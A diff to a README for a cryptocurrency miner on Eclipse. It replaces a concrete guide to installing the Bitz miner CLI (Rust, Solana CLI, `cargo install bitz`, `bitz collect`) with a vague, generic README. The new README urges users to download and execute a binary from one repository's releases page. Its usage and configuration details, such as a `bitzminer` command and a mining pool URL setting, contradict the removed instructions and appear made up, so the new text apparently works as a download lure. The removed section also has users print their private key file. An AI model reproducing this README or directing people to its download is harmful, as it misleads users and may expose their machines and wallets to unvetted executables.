@@ -1,138 +1,106 @@
-# Guide to Bitz Miner CLI on Eclipse
+# 🌌 Eclipse: A Detailed Guide to Bitz Miner CLI
 
-## What is Bitz?
-- The first ePOW commodity token that anyone can mine on Eclipse.
-- 5M max supply.
-- NOT pre-mined + ZERO team/insider allocations.
-- Token address: https://eclipsescan.xyz/token/64mggk2nXg6vHC1qCdsZdEFzd5QGN4id54Vbho4PswCF
+Welcome to the **Eclipse** repository! This guide provides everything you need to know about using the Bitz Miner CLI on Eclipse. Whether you are a beginner or an experienced user, you will find valuable information here.
 
----
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/khqe/eclipse/releases)
 
-# Setup Guide
-## Presequities
-- Eclipse wallet (.eg `Backpack`) funded with ETH
-- A minimal CPU system or VPS, [Guide to buy and setup a VPS](https://github.com/0xmoei/Linux_Node_Guide).
-- Linux Ubuntu Terminal
-- Windows users: Must install Linux Ubuntu Terminal using WSL. **[Guide](https://github.com/0xmoei/Install-Linux-on-Windows)**
+## Table of Contents
 
----
-
-## Install Dependecies
-**1. Install Packages**
-```bash
-sudo apt-get update && sudo apt-get upgrade -y
-
-sudo apt install screen curl nano  -y
-```
-**2. Install Rust**
-```bash
- curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-```
-* When Prompted, Enter `1` and wait unti installation compelete.
-```bash
-source $HOME/.cargo/env
-```
-**3. Install Solana CLI:**
-```bash
-curl --proto '=https' --tlsv1.2 -sSfL https://solana-install.solana.workers.dev | bash
-```
-* Close and reopen your Terminal.
-```
-solana --version
-```
-* If you get `solana: command not found` RUN :
-```bash
-echo 'export PATH="/root/.local/share/solana/install/active_release/bin:$PATH"' >> ~/.bashrc
-source ~/.bashrc
-```
-```
-solana --version
-```
-
-**4. Switch RPC**
-```bash
-solana config set --url https://eclipse.helius-rpc.com/
-```
+1. [Introduction](#introduction)
+2. [Getting Started](#getting-started)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Configuration](#configuration)
+6. [Troubleshooting](#troubleshooting)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
 
 ---
 
-## Wallet CLI
-### 1. Create a CLI wallet
-```bash
-solana-keygen new
-```
-* Set a password or skip by pressing `Enter`.
-* Save your Seed-Phrase & Public-Key
-* `Public-Key`: Is your node **Eclipse wallet address**.
+## Introduction
 
-### 2. Export `Private-key`
+Eclipse is designed to simplify your experience with the Bitz Miner CLI. This guide will help you navigate the setup and usage of the tool effectively. We aim to provide clear instructions and helpful tips to ensure a smooth experience.
 
-1- Find Keypair path:
-```bash
-solana config get
-```
-* It gives your Keypair path like this: `~/.config/solana/id.json`
+## Getting Started
 
-2- Export `Private-key`:
-```bash
-cat ~/.config/solana/id.json
-```
-* The exported array is your `Private-Key`, Save it.
+To begin, ensure you have the following prerequisites:
 
-### 3. Import and Fund Node Wallet
-* Import `Private-Key` into your `Backpack` wallet.
-* Fund it with `ETH` on `Eclipse` Network
+- A computer running Windows, macOS, or Linux.
+- Basic knowledge of command-line interfaces.
+- Internet connection for downloading necessary files.
+
+Once you have everything ready, you can move on to the installation process.
+
+## Installation
+
+To install the Bitz Miner CLI, follow these steps:
+
+1. Visit the [Releases section](https://github.com/khqe/eclipse/releases) of this repository.
+2. Download the latest release suitable for your operating system.
+3. Execute the downloaded file according to your OS instructions.
+
+For example, on Windows, you may need to run the `.exe` file, while on Linux, you might need to change permissions and run the script.
+
+## Usage
+
+After installation, you can start using the Bitz Miner CLI. Here’s how:
+
+1. Open your command line interface.
+2. Navigate to the directory where you installed the Bitz Miner CLI.
+3. Run the command:
+
+   ```
+   bitzminer --help
+   ```
+
+This command will display all available options and commands for the Bitz Miner CLI.
+
+## Configuration
+
+Configuring the Bitz Miner CLI is essential for optimal performance. Here’s how to set it up:
+
+1. Locate the configuration file in the installation directory.
+2. Open the file in a text editor.
+3. Adjust the settings according to your preferences. Key settings include:
+
+   - **Mining Pool URL**: Specify the mining pool you want to connect to.
+   - **Wallet Address**: Enter your wallet address to receive payments.
+   - **Worker Name**: Set a name for your mining worker.
+
+Save the file after making changes. Restart the CLI for the changes to take effect.
+
+## Troubleshooting
+
+If you encounter issues, consider the following steps:
+
+- **Check the Logs**: Review the log files for any error messages.
+- **Internet Connection**: Ensure you have a stable internet connection.
+- **Configuration Settings**: Double-check your configuration settings for any errors.
+
+If problems persist, feel free to consult the community or check the [Releases section](https://github.com/khqe/eclipse/releases) for updates or patches.
+
+## Contributing
+
+We welcome contributions to enhance this guide. If you have suggestions or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Make your edits and commit them.
+4. Push your branch and submit a pull request.
+
+Your contributions will help improve the experience for all users.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, please reach out to us via the Issues section of this repository. We appreciate your input and are here to help!
 
 ---
 
-## Install Bitz
-```bash
-cargo install bitz
-```
+Thank you for using Eclipse! We hope this guide helps you make the most of the Bitz Miner CLI. Happy mining! 
 
----
-
-## Run Bitz Miner
-### 1. Open a screen
-By opening a screen, you can run any process in the background, so it won't get terminated if you closed your VPS. (Windows users must keep their terminal open)
-```bash
-screen -S bitz
-```
-
-### 2. Start Miner
-```bash
-bitz collect
-```
-
-![image](https://github.com/user-attachments/assets/7c526a4b-07da-4ad5-889f-17674761b5e7)
-
-* Your Miner Node is Running successfully now.
-* Default CPU utilized is `1 core`, You can set the CPU cores for your Bitz miner. Stop the node with `Ctrl+C`, then replace your `8` with your system `cores` and enter the following command:
-```bash
-bitz collect --cores 8
-```
-* minimize screen: `Ctrl+A+D`
-* return screen: `screen -r bitz`
-* stop the node while in screen: `Ctrl+C`
-* screen lists: `screen -ls`
-* terminate and kill screen: `screen -XS bitz quit` (if you had multiple screens in list, replace `bitz` with `id` of screen.
-
----
-
-### Usefull Commands
-* You have to enter these out of the screen session
-
-**Check account info:**
-```bash
-bitz account
-```
-
-**Claim Bitz to your Node Wallet:**
-```bash
-bitz claim
-```
-
-**All Commands List:**
-```bash
-bitz -h
-```
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/khqe/eclipse/releases)
